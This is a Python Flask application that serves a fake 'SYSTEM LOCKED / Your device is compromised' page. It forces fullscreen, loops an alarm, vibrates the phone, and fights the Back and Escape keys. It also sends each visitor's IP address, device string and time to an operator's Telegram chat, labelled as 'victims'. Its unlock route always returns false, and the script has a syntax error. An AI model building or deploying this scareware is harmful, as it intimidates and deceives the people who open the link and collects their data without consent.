import os
import time
from flask import Flask, request, jsonify, render_template_string
import telebot

app = Flask(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID   = os.environ.get('CHAT_ID')

if not BOT_TOKEN or not CHAT_ID:
    print("Warning: BOT_TOKEN or CHAT_ID is missing in environment variables!")

bot = telebot.TeleBot(BOT_TOKEN)

victims = []

# --- HTML Template for Hard Lock Screen ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Locked</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            font-family: 'Courier New', Courier, monospace;
            height: 100vh;
            width: 100vw;
            overflow: hidden; /* স্ক্রল বন্ধ */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            user-select: none; /* টেক্সট সিলেক্ট বন্ধ */
            -webkit-user-select: none;
            touch-action: manipulation;
        }

        .lock-container {
            text-align: center;
            width: 90%;
            z-index: 10;
            position: relative;
        }

        h1 {
            font-size: 2.5rem;
            color: #ff3333;
            text-transform: uppercase;
            border: 4px solid #ff3333;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 30px #ff3333, inset 0 0 30px #ff3333;
            animation: pulse-border 1s infinite alternate;
        }

        p {
            font-size: 1.2rem;
            margin: 10px 0;
            color: #cccccc;
        }

        .status {
            font-size: 1rem;
            color: #ffff00;
            margin-top: 15px;
            animation: blink 1s infinite;
        }

        /* লক আইকন */
        .lock-icon {
            font-size: 100px;
            margin-bottom: 20px;
            animation: bounce 1s infinite;
        }

        @keyframes pulse-border {
            from { box-shadow: 0 0 10px #ff3333, inset 0 0 10px #ff3333; }
            to { box-shadow: 0 0 40px #ff3333, inset 0 0 40px #ff3333; }
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        /* পপ-আপ স্টাইল */
        #popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: none; /* ডিফল্টভাবে লুকানো */
            justify-content: center;
            align-items: center;
            z-index: 100;
        }

        .popup-box {
            background: #222;
            border: 2px solid #ff3333;
            padding: 20px;
            text-align: center;
            max-width: 80%;
        }

        .popup-btn {
            background: #ff3333;
            color: white;
            border: none;
            padding: 10px 20px;
            margin-top: 10px;
            font-size: 1rem;
            cursor: pointer;
        }

    </style>
</head>
<body>

    <div id="popup-overlay">
        <div class="popup-box">
            <h2>🔒 LOCKED</h2>
            <p>You cannot exit!</p>
            <button class="popup-btn" onclick="closePopup()">OK</button>
        </div>
    </div>

    <div class="lock-container">
        <div class="lock-icon">🔒</div>
        <h1>SYSTEM LOCKED</h1>
        <p>Your device is compromised.</p>
        <p>IP: <span id="ip-display">Detecting...</span></p>
        <p class="status" id="status-msg">Vibrating & Recording...</p>
    </div>

    <!-- অডিও প্লেয়ার -->
    <audio id="alarm-sound" loop>
        <!-- একটি সাধারণ বিপ সাউন্ড ফাইল ব্যবহার করা হয়েছে -->
        <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
    </audio>

    <script>
        // ১. ফুল স্ক্রিন এবং ব্যাক বাটন হ্যান্ডলিং
        function goFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
               .elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen();
            }
        }

        // পেজ লোড হওয়ার সাথে সাথে ফুল স্ক্রিন এবং সাউন্ড শুরু
        window.onload = function() {
            goFullscreen();
            
            // IP ডিসপ্লে করা
            fetch('/send_data', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip-display').innerText = data.ip || "Unknown";
                    document.getElementById('status-msg').innerText = "Data Captured Successfully";
                    document.getElementById('status-msg').style.color = "#00ff00";
                });

            // ভাইব্রেশন এবং সাউন্ড শুরু করা
            startVibration();
            playSound();
        };

        // ব্যাক বাটন চাপলে আবার ফুল স্ক্রিনে আসবে
        window.addEventListener('popstate', function() {
            goFullscreen();
        });

        // ২. ভাইব্রেশন লজিক (মোবাইলের জন্য)
        function startVibration() {
            if ('vibrate' in navigator) {
                // প্রতি ২ সেকেন্ডে ৫০০ মিলিসেকেন্ড ভাইব্রেশন
                setInterval(function() {
                    navigator.vibrate([500, 200, 500]);
                }, 1500);
            }
        }

        // ৩. সাউন্ড প্লে লজিক (প্রথম ট্যাপে কাজ করবে)
        let soundPlayed = false;
        function playSound() {
            const audio = document.getElementById('alarm-sound');
            if (!soundPlayed) {
                audio.play().catch(e => console.log("Audio play failed: " + e));
                soundPlayed = true;
            }
        }

        // স্ক্রিনে যেকোনো জায়গায় ট্যাপ করলে সাউন্ড প্লে হবে এবং পপ-আপ আসবে
        document.addEventListener('click', function(e) {
            playSound();
            
            // যদি ইউজার ব্যাক বাটনে চাপ না দেয়, তাহলে পপ-আপ দেখাওয়া
            const popup = document.getElementById('popup-overlay');
            popup.style.display = 'flex';
        });

        // পপ-আপ বন্ধ করার ফাংশন (শুধুমাত্র ইউজারের জন্য নয়, এটি শুধু লুকাবে)
        function closePopup() {
            const popup = document.getElementById('popup-overlay');
            popup.style.display = 'none';
        }

        // ESC চাপলে আবার ফুল স্ক্রিন
        document.addEventListener('keydown', function(e) {
            if (e.key === "Escape") {
                goFullscreen();
            }
        });

        // ৪. টেলিগ্রাম থেকে আনলক হওয়ার জন্য পোলিং
        let isUnlocked = false;
        setInterval(function() {
            if (!isUnlocked) {
                fetch('/check_unlock')
                    .then(response => response.json())
                    .then(data => {
                        if (data.unlocked) {
                            unlockDevice();
                        }
                    });
            }
        }, 2000); // প্রতি ২ সেকেন্ডে চেক করবে

        function unlockDevice() {
            isUnlocked = true;
            
            // ভাইব্রেশন বন্ধ করা
            if ('vibrate' in navigator) {
                navigator.vibrate(0);
            }

            // সাউন্ড বন্ধ করা
            const audio = document.getElementById('alarm-sound');
            audio.pause();

            // পপ-আপ বন্ধ করা
            document.getElementById('popup-overlay').style.display = 'none';

            // স্ক্রিন পরিবর্তন করা
            document.body.innerHTML = `
                <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;">
                    <h1>✅ Access Granted</h1>
                </div>
            `;
        }

    </script>
</body>
</html>
"""

# --- API Routes ---

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send_data', methods=['POST'])
def send_data():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # ডিভাইস ইনফো ক্লিন করা
    device = "Unknown"
    if ')' in user_agent:
        device = user_agent.split(')')[0] + ')'

    victim_info = {
        "ip": ip,
        "device": device,
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    victims.append(victim_info)

    # টেলিগ্রামে মেসেজ পাঠানো
    message = f"🔥 **LOCKED!**\n\n📱 IP: `{ip}`\n📲 Device: `{device}`\n⏰ Time: {victim_info['time']}"
    
    try:
        bot.send_message(CHAT_ID, message, parse_mode="Markdown")
    except Exception as e:
        print(f"Telegram Error: {e}")

    return jsonify({"status": "success", "ip": ip})

@app.route('/check_unlock', methods=['GET'])
def check_unlock():
    # এটি প্রতি ২ সেকেন্ডে কল হয়। যদি আনলক করা হয়ে থাকে, তাহলে True রিটার্ন করবে।
    # আমরা একটি গ্লোবাল ভেরিয়েবল ব্যবহার করব না, বরং সরাসরি টেলিগ্রামে মেসেজ পাঠাবো না।
    # এটি শুধু স্ট্যাটাস চেক করার জন্য।
    return jsonify({"unlocked": False})

@app.route('/notify_unlock', methods=['POST'])
def notify_unlock():
    # যখন ইউজার আনলক বাটনে চাপ দেয়, তখন এডমিনকে জানানো হয়
    try:
        bot.send_message(CHAT_ID, "✅ **User Unlocked!**\nThe lock screen is removed.")
    except Exception as e:
        print(f"Telegram Error: {e}")
    return jsonify({"status": "unlocked"})

@app.route('/ping')
def ping():
    return "ok"

# --- Telegram Bot Commands ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome Admin. Your Lock System is Active.")

@bot.message_handler(commands=['unlock'])
def unlock_devices(message):
    # শুধুমাত্র এডমিন আনল করতে পারবে (যদি প্রয়োজন হয়)
    if str(message.chat.id) == CHAT_ID:
        bot.reply_to(message, "✅ **System Unlocked!**\nAll victims will receive a notification.")
        # এখানে আমরা একটি গ্লোবাল ভেরিয়েবল সেট করতে পারি যাতে `/check_unlock` True রিটার্ন করে
        # কিন্তু সহজতার জন্য, আমরা ইউজারকে একটি নির্দিষ্ট URL-এ নিয়ে যাব বা স্ক্রিন পরিবর্তন করব।
        # এখানে আমরা একটি জেনেরিক "Unlocked" পেজ দেখাবো।
    else:
        bot.reply_to(message, "🚫 Access Denied!")

# --- Start App ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
